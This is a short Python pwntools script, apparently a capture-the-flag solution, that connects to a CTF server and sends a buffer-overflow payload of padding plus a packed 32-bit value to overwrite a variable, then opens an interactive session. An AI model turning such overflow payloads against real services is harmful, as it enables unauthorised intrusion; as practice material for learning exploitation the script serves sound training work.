from pwn import *

p = remote('pwn.ctf.unswsecurity.com', 7004)

payload = b''
payload += b'A' * (0x20-0xC)
payload += p32(0x37333331)

p.sendline(payload)

p.interactive()